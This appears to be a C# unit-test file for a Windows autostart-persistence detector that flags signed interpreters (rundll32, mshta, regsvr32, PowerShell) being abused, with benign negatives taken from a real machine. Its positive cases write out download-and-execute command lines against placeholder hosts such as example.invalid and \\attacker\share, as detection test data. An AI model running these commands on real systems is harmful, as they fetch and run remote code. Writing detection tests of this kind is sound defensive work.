using WinSight.Core;
using WinSight.Persistence;
using Xunit;

namespace WinSight.Persistence.Tests;

/// <summary>
/// The command-line rule, exercised from both ends: it must fire on the techniques it was written
/// for, and it must stay silent on the entries a real machine actually has.
/// </summary>
/// <remarks>
/// A detector that has never been observed firing is indistinguishable from a broken one, and this
/// one is designed to return nothing on a healthy desktop — measured, 15 interpreter entries and
/// zero findings. So the positives here are synthetic on purpose, and the negatives are the exact
/// command lines read off that machine.
/// </remarks>
public sealed class InterpreterAbuseTriageTests
{
    [Theory]
    // The classic: a signed interpreter given an inline script through a protocol handler.
    [InlineData("rundll32.exe", @"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";eval(...)", InterpreterAbuse.EncodedCommand)]
    [InlineData("powershell.exe", "powershell.exe -enc SQBFAFgAIAAoAA==", InterpreterAbuse.EncodedCommand)]
    // A literal URL is the more concrete evidence, so it names the finding even though the same
    // command line also matches the download primitive.
    [InlineData("powershell.exe", "powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')", InterpreterAbuse.RemotePayload)]
    // The same technique with the destination built at runtime: no URL to point at, so the
    // download primitive is all the evidence there is, and it is still reported.
    [InlineData("powershell.exe", "powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString($u)", InterpreterAbuse.EncodedCommand)]
    [InlineData("mshta.exe", "mshta.exe https://example.invalid/a.hta", InterpreterAbuse.RemotePayload)]
    [InlineData("regsvr32.exe", "regsvr32.exe /s /u /i:http://example.invalid/a.sct scrobj.dll", InterpreterAbuse.RemotePayload)]
    [InlineData("regsvr32.exe", @"regsvr32.exe /s /i:C:\a.sct scrobj.dll", InterpreterAbuse.ScriptletCom)]
    [InlineData("rundll32.exe", @"rundll32.exe C:\Users\bob\AppData\Roaming\update.dll,Start", InterpreterAbuse.PerUserPayload)]
    [InlineData("wscript.exe", @"wscript.exe %TEMP%\run.vbs", InterpreterAbuse.PerUserPayload)]
    [InlineData("cmd.exe", @"cmd.exe /c \\attacker\share\a.bat", InterpreterAbuse.RemotePayload)]
    public void Classify_NamesTheTechnique(string image, string command, InterpreterAbuse expected) =>
        Assert.Equal(expected, InterpreterAbuseTriage.Classify(image, command));

    [Theory]
    // Every command line measured on a real desktop that resolves to an interpreter.
    [InlineData("rundll32.exe", @"%windir%\system32\rundll32.exe advapi32.dll,ProcessIdleTasks")]
    [InlineData("rundll32.exe", @"C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install")]
    [InlineData("rundll32.exe", @"C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install")]
    [InlineData("cmd.exe", @"%systemroot%\system32\cmd.exe /c hotpatch.cmd")]
    [InlineData("explorer.exe", "explorer.exe")]
    public void Classify_IsSilentOnWhatARealMachineActuallyRuns(string image, string command) =>
        Assert.Equal(InterpreterAbuse.None, InterpreterAbuseTriage.Classify(image, command));

    /// <summary>
    /// The gate is both halves. Ordinary software passes profile paths on its command line
    /// constantly, and flagging that would bury the operator under its own installed programs.
    /// </summary>
    [Theory]
    [InlineData("setup.exe", @"C:\Users\bob\AppData\Local\App\setup.exe --update")]
    [InlineData("app.exe", "app.exe https://vendor.invalid/check")]
    public void Classify_RequiresAnInterpreter_NotJustASuspiciousLookingArgument(string image, string command) =>
        Assert.Equal(InterpreterAbuse.None, InterpreterAbuseTriage.Classify(image, command));

    /// <summary>
    /// <c>\\?\</c> and <c>\\.\</c> are Win32 escapes for long and device paths, not network shares.
    /// Reading either as remote would be a confident false accusation against a local file.
    /// </summary>
    [Theory]
    [InlineData(@"cmd.exe /c \\?\C:\Windows\System32\config\x.bat")]
    [InlineData(@"cmd.exe /c \\.\PhysicalDrive0")]
    public void Classify_DoesNotMistakeALocalDevicePathForANetworkShare(string command) =>
        Assert.Equal(InterpreterAbuse.None, InterpreterAbuseTriage.Classify("cmd.exe", command));

    /// <summary>A genuine UNC share is still reported once the escapes are excluded.</summary>
    [Fact]
    public void Classify_StillReportsAGenuineUncShare() =>
        Assert.Equal(
            InterpreterAbuse.RemotePayload,
            InterpreterAbuseTriage.Classify("cmd.exe", @"cmd.exe /c \\?\C:\ok.bat && \\attacker\share\a.bat"));

    [Theory]
    [InlineData(null, "rundll32.exe x")]
    [InlineData("rundll32.exe", null)]
    [InlineData("", "")]
    public void Classify_HandlesAbsentInput(string? image, string? command) =>
        Assert.Equal(InterpreterAbuse.None, InterpreterAbuseTriage.Classify(image, command));

    /// <summary>
    /// The whole point: an entry whose file verdict is clean is still flagged, and says why.
    /// </summary>
    [Fact]
    public void SuspicionSurvivesAValidSignature()
    {
        var entry = Entry(
            @"C:\Windows\System32\rundll32.exe",
            @"rundll32.exe C:\Users\bob\AppData\Roaming\update.dll,Start");

        Assert.Equal(PersistenceStatus.SignatureValid, entry.Status);
        Assert.Equal(InterpreterAbuse.PerUserPayload, entry.Abuse);
        Assert.True(entry.IsSuspicious);
        Assert.NotNull(InterpreterAbuseTriage.Describe(entry.Abuse));
    }

    /// <summary>A signed interpreter doing ordinary work stays out of the flagged view.</summary>
    [Fact]
    public void AnOrdinarySignedInterpreterEntryIsNotSuspicious()
    {
        var entry = Entry(
            @"C:\Windows\System32\rundll32.exe",
            @"%windir%\system32\rundll32.exe advapi32.dll,ProcessIdleTasks");

        Assert.Equal(InterpreterAbuse.None, entry.Abuse);
        Assert.False(entry.IsSuspicious);
    }

    /// <summary>
    /// Classification falls back to the command's leading token when nothing resolved on disk, so an
    /// entry pointing at an interpreter that is missing or inaccessible is still read.
    /// </summary>
    [Fact]
    public void ClassificationFallsBackToTheCommandWhenNoImageResolved()
    {
        var entry = new AutostartEntry(
            AutostartVector.RunKey,
            "x",
            @"HKCU\...\Run",
            @"""mshta.exe"" https://example.invalid/a.hta",
            ImagePath: null,
            ExpectedImagePath: null,
            ImageResolutionStatus.Unresolved,
            new SignatureVerdict(SignatureState.Unknown, null));

        Assert.Equal(InterpreterAbuse.RemotePayload, entry.Abuse);
    }

    [Fact]
    public void DescribeSaysNothingWhenThereIsNothingToSay() =>
        Assert.Null(InterpreterAbuseTriage.Describe(InterpreterAbuse.None));

    private static AutostartEntry Entry(string image, string command) => new(
        AutostartVector.ScheduledTask,
        "task",
        @"C:\Windows\System32\Tasks\task",
        command,
        ImagePath: image,
        ExpectedImagePath: image,
        ImageResolutionStatus.Present,
        new SignatureVerdict(SignatureState.SignedTrusted, "CN=Microsoft Windows"));
}
